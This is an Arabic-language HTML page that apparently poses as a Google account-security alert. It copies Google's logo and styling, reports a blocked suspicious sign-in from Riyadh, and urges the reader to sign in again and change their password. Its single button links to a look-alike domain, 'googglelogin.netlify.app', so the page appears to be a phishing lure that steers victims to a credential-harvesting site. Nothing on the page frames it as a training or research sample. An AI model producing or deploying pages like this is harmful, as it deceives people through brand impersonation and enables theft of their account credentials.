<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أمان الحساب - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; text-align: center; }
        .icon-box { color: #d93025; font-size: 48px; margin-bottom: 20px; }
        h1 { font-size: 22px; color: #202124; font-weight: 500; margin-bottom: 15px; }
        p { color: #5f6368; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
        .btn-action { 
            background-color: #1a73e8; 
            color: #fff; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 4px; 
            font-weight: 500; 
            cursor: pointer; 
            text-decoration: none;
            display: inline-block;
            font-size: 14px;
        }
        .btn-action:hover { background-color: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
        .logo { height: 24px; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <div class="icon-box">⚠️</div>
    <h1>تم اكتشاف محاولة تسجيل دخول مشبوهة</h1>
    <p>
        تم حظر محاولة تسجيل دخول إلى حسابك من جهاز غير معروف في (الرياض، المملكة العربية السعودية). 
        لحماية خصوصيتك، يرجى إعادة تسجيل الدخول وتغيير كلمة المرور فوراً لتأمين حسابك.
    </p>
    
    <a href="https://googglelogin.netlify.app/" class="btn-action">
        تأمين الحساب الآن
    </a>
</div>

</body>
</html>
